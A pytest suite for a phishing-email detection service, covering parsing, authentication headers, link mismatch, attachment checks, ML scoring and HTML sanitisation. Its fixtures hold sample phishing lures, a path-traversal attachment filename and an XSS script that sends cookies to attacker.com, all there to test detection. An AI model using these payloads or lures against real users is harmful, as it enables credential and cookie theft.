"""
ScamBuster — Phase 05 Email Pipeline Comprehensive Test Suite

Tests:
1. Email parsing (plain text, HTML, multipart, missing headers, malformed email)
2. Header analysis (From/Reply-To mismatch, SPF pass/fail, DKIM pass/fail, DMARC)
3. URL & Anchor extraction (single URL, multiple URLs, anchor/destination mismatch)
4. Attachment metadata inspection (safe, suspicious, double-extension, path-traversal prevention)
5. ML model inference (loading, prediction, top features, fallback on corrupt/missing model)
6. Unified Risk Engine scoring and category taxonomy for email
7. API Integration (POST /scan/email with raw email, structured JSON, validation rejections)
8. File Upload Integration (POST /scan/email/upload with .eml multipart)
9. Security & Untrusted Input (script injection, oversized rejection, path traversal in attachments)
"""

import io
import pytest
from httpx import ASGITransport, AsyncClient

from app.main import create_application
from app.services.email_parser import (
    parse_raw_email,
    parse_structured_email,
    AttachmentMetadata,
    AuthResults,
)
from app.services.email_preprocessor import (
    preprocess_email,
    check_anchor_mismatch,
)
from app.services.email_feature_extractor import extract_email_features
from app.services.email_rule_detector import evaluate_email_rules
from app.ml.email_inference import EmailModelManager, predict_email_threat
from app.risk_engine.scorer import (
    calculate_email_rule_score,
    calculate_unified_email_risk,
)
from app.risk_engine.categories import determine_email_categories
from app.risk_engine.explanations import (
    generate_email_summary,
    generate_email_recommendation,
    generate_email_reasons,
)


@pytest.fixture
def test_app():
    return create_application()


# ============================================================================
# 1. Email Parsing Tests
# ============================================================================

def test_parse_plain_text_email():
    raw = """From: sender@example.com
To: user@example.com
Subject: Test Plain Email
Date: Fri, 25 Sep 2026 12:00:00 +0000

This is a simple plain text message body.
"""
    parsed = parse_raw_email(raw)
    assert parsed.subject == "Test Plain Email"
    assert parsed.sender_address == "sender@example.com"
    assert parsed.sender_domain == "example.com"
    assert "This is a simple plain text" in parsed.body_text
    assert parsed.is_malformed is False


def test_parse_html_email():
    raw = """From: alerts@bank.example
To: victim@example.com
Subject: Account Alert
Content-Type: text/html; charset=UTF-8

<html>
  <body>
    <p>Please update your account by clicking <a href="https://phish.example/login">here</a>.</p>
  </body>
</html>
"""
    parsed = parse_raw_email(raw)
    assert parsed.subject == "Account Alert"
    assert "Please update your account" in parsed.body_text
    assert "<html" not in parsed.body_text  # Markup safely stripped in normalized body


def test_parse_multipart_with_attachments():
    raw = """From: hr@corporate.example
To: employee@corporate.example
Subject: Important Document
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY123"

--BOUNDARY123
Content-Type: text/plain; charset=UTF-8

Please find the requested invoice attached.

--BOUNDARY123
Content-Type: application/octet-stream; name="invoice.pdf.exe"
Content-Disposition: attachment; filename="../../invoice.pdf.exe"

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAa...
--BOUNDARY123--
"""
    parsed = parse_raw_email(raw)
    assert parsed.subject == "Important Document"
    assert len(parsed.attachments) == 1
    att = parsed.attachments[0]
    # Path traversal characters should be stripped
    assert att.filename == "invoice.pdf.exe"
    assert att.is_double_extension is True
    assert att.is_suspicious_extension is True


def test_parse_malformed_email_graceful_handling():
    malformed = "Subject:: broken\nFrom::: unparseable<<<>>\n\nGarbled text body without MIME headers."
    parsed = parse_raw_email(malformed)
    assert parsed is not None
    assert "Garbled text body" in parsed.body_text


# ============================================================================
# 2. Header Analysis Tests
# ============================================================================

def test_header_sender_replyto_mismatch():
    raw = """From: Security Team <support@trustedbank.com>
Reply-To: attacker@mail-divert-host.net
Subject: Security Verification Required

Please confirm your identity.
"""
    parsed = parse_raw_email(raw)
    pre = preprocess_email(parsed)
    assert pre.has_sender_replyto_mismatch is True
    assert "trustedbank.com" in pre.domain_mismatch_reason
    assert "mail-divert-host.net" in pre.domain_mismatch_reason


def test_header_authentication_parsing():
    raw_pass = """From: legit@verified.com
Authentication-Results: mx.google.com; dkim=pass; spf=pass; dmarc=pass
Subject: Verified Notification

Everything verified.
"""
    parsed_pass = parse_raw_email(raw_pass)
    assert parsed_pass.auth_results.spf_status == "pass"
    assert parsed_pass.auth_results.dkim_status == "pass"
    assert parsed_pass.auth_results.dmarc_status == "pass"

    raw_fail = """From: spoofed@brand.com
Received-SPF: fail (google.com: domain does not designate 192.0.2.1 as permitted sender)
Authentication-Results: mail.example.com; dkim=fail; dmarc=fail
Subject: Suspicious Header

Auth failed.
"""
    parsed_fail = parse_raw_email(raw_fail)
    assert parsed_fail.auth_results.spf_status == "fail"
    assert parsed_fail.auth_results.dkim_status == "fail"
    assert parsed_fail.auth_results.dmarc_status == "fail"


# ============================================================================
# 3. URL & Anchor Mismatch Extraction Tests
# ============================================================================

def test_anchor_mismatch_detection():
    # Misleading visual link: Text says paypal.com, href is evil.com
    is_mismatch, reason = check_anchor_mismatch("https://paypal.com/verify", "http://evil-phish.com/login")
    assert is_mismatch is True
    assert "paypal.com" in reason
    assert "evil-phish.com" in reason

    # Legitimate matching link
    is_legit, _ = check_anchor_mismatch("https://chase.com/login", "https://chase.com/login")
    assert is_legit is False


def test_html_link_and_form_extraction():
    html_email = """From: notice@service.com
Subject: Form Alert
Content-Type: text/html

<html>
  <body>
    <form action="http://phish-capture.net/submit" method="POST">
      <input type="hidden" name="token" value="1234">
      <input type="password" name="pwd">
    </form>
    <a href="http://untrusted-host.xyz/path">Click Here</a>
  </body>
</html>
"""
    parsed = parse_raw_email(html_email)
    pre = preprocess_email(parsed)
    assert pre.html_form_count == 1
    assert pre.html_hidden_element_count == 1
    assert len(pre.extracted_urls) >= 1
    assert "http://untrusted-host.xyz/path" in pre.extracted_urls


# ============================================================================
# 4. Feature Extraction & Rule Detection Tests
# ============================================================================

def test_rule_detector_critical_phishing_email():
    raw = """From: Security <security@chase-service.com>
Reply-To: phisher@harvest-redirect.ru
Authentication-Results: mx.example.com; spf=fail; dkim=fail
Content-Type: text/html
Subject: URGENT: Your account is suspended immediately

<html>
  <body>
    <p>Dear customer, your account has been locked due to unauthorized access.</p>
    <p>You must confirm your login credentials and verify account password within 24 hours or access will be terminated.</p>
    <p><a href="http://chase-security-verify.ru/login">https://www.chase.com/verify-identity</a></p>
  </body>
</html>
"""
    parsed = parse_raw_email(raw)
    pre = preprocess_email(parsed)
    features = extract_email_features(pre)
    findings = evaluate_email_rules(pre, features)

    rule_ids = {f.rule_id for f in findings}
    assert "RULE_EMAIL_SENDER_REPLYTO_MISMATCH" in rule_ids
    assert "RULE_EMAIL_AUTH_FAILURE" in rule_ids
    assert "RULE_EMAIL_ANCHOR_MISMATCH" in rule_ids
    assert "RULE_EMAIL_CREDENTIAL_SOLICITATION" in rule_ids
    assert "RULE_EMAIL_URGENCY_THREAT" in rule_ids


def test_rule_detector_clean_email():
    clean_raw = """From: friend@example.com
To: me@example.com
Subject: Lunch tomorrow

Hey, let's meet up for lunch tomorrow around 12:30pm at the usual diner.
"""
    parsed = parse_raw_email(clean_raw)
    pre = preprocess_email(parsed)
    features = extract_email_features(pre)
    findings = evaluate_email_rules(pre, features)
    assert len(findings) == 0


# ============================================================================
# 5. ML Model Inference Tests
# ============================================================================

def test_email_ml_inference():
    manager = EmailModelManager.get_instance()
    assert manager.is_ready() is True

    # Phishing prompt
    phish_res = predict_email_threat(
        "Urgent: Account Suspended",
        "Your account has been suspended. Please confirm billing info and verify password immediately."
    )
    assert phish_res["available"] is True
    assert phish_res["prediction"] == "phishing"
    assert phish_res["model_probability"] >= 0.50

    # Benign prompt
    benign_res = predict_email_threat(
        "Meeting Minutes from Yesterday",
        "Hi everyone, here are the action items discussed in our project engineering sync."
    )
    assert benign_res["available"] is True
    assert benign_res["prediction"] == "legitimate"


# ============================================================================
# 6. Unified Risk Engine Tests
# ============================================================================

def test_unified_risk_engine_scoring():
    # Critical findings: anchor mismatch
    from app.services.email_rule_detector import EmailRuleFinding

    findings = [
        EmailRuleFinding(
            rule_id="RULE_EMAIL_ANCHOR_MISMATCH",
            name="Deceptive Hyperlink",
            severity="CRITICAL",
            score_weight=40,
            description="Mismatch",
            evidence="Displayed bank, points to phish",
        )
    ]
    ml_res = {"available": True, "model_probability": 0.90, "prediction": "phishing"}
    score, level, conf, r_score, m_score = calculate_unified_email_risk(findings, ml_res)
    assert score >= 80
    assert level == "critical"
    assert conf >= 0.85


# ============================================================================
# 7. API Integration Tests (POST /scan/email)
# ============================================================================

@pytest.mark.asyncio
async def test_scan_email_api_json_raw(test_app):
    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "raw_email": """From: support@secure-bank.com
Reply-To: attacker@phishing-divert.xyz
Subject: URGENT: Confirm your password and verify account
Content-Type: text/html

<html><body><p>Enter your password immediately <a href="http://phish.net/login">https://secure-bank.com/login</a></p></body></html>
"""
        }
        resp = await client.post("/api/v1/scan/email", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["scan_type"] == "email"
        assert data["composite_risk_score"] >= 70
        assert data["risk_level"] in ["high", "critical"]
        assert "detection" in data
        assert data["detection"]["rules"]["risk_score"] > 0
        assert "headers" in data["detection"]
        assert len(data["indicators"]) >= 1


@pytest.mark.asyncio
async def test_scan_email_api_structured(test_app):
    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "subject": "Monthly Newsletter",
            "sender": "news@company.com",
            "body": "Here is the monthly engineering newsletter for September.",
            "reply_to": "news@company.com",
            "attachments": []
        }
        resp = await client.post("/api/v1/scan/email", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["scan_type"] == "email"
        assert data["composite_risk_score"] <= 35
        assert data["risk_level"] in ["low", "very_low"]


@pytest.mark.asyncio
async def test_scan_email_api_validation_error(test_app):
    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Empty payload
        resp = await client.post("/api/v1/scan/email", json={})
        assert resp.status_code == 422


# ============================================================================
# 8. File Upload Tests (POST /scan/email/upload)
# ============================================================================

@pytest.mark.asyncio
async def test_scan_email_upload_eml(test_app):
    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        eml_content = b"""From: billing@trusted-service.com
Subject: Your monthly invoice
Content-Type: text/plain

Thank you for your business. Your monthly receipt is attached.
"""
        files = {"file": ("invoice.eml", io.BytesIO(eml_content), "message/rfc822")}
        resp = await client.post("/api/v1/scan/email/upload", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["scan_type"] == "email"
        assert "Your monthly invoice" in data["target"]


@pytest.mark.asyncio
async def test_scan_email_upload_empty_file_rejected(test_app):
    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("empty.eml", io.BytesIO(b"   "), "message/rfc822")}
        resp = await client.post("/api/v1/scan/email/upload", files=files)
        assert resp.status_code == 422


# ============================================================================
# 9. Security & Untrusted Input Tests
# ============================================================================

def test_security_html_script_injection_sanitization():
    malicious_html = """From: hacker@attack.com
Subject: Exploit Test
Content-Type: text/html

<script>alert('XSS'); window.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
<iframe src="http://malware.org"></iframe>
<p>Legitimate looking text</p>
"""
    parsed = parse_raw_email(malicious_html)
    # Ensure JavaScript and iframe tags are completely stripped from normalized body text
    assert "<script" not in parsed.body_text
    assert "<iframe" not in parsed.body_text
    assert "Legitimate looking text" in parsed.body_text
